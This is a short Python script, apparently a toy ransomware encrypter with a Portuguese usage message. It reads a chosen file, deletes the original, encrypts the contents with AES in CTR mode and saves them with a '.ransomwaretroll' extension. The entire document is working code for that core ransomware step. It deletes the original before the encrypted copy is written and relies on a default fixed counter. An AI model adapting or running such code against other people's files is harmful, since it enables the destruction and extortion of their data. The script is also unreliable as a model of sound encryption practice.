import os
import pyaes
import sys

if len(sys.argv)<= 2:
    print("Por favor, insira o nome do arquivo a ser criptografado e sua chave. Exemplo: python3 encrypter.py nome-do-arquivo chave-de-16-24-ou-32-bytes")
    sys.exit()


file_name = sys.argv[1]
key = sys.argv[2].encode('utf-8')
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
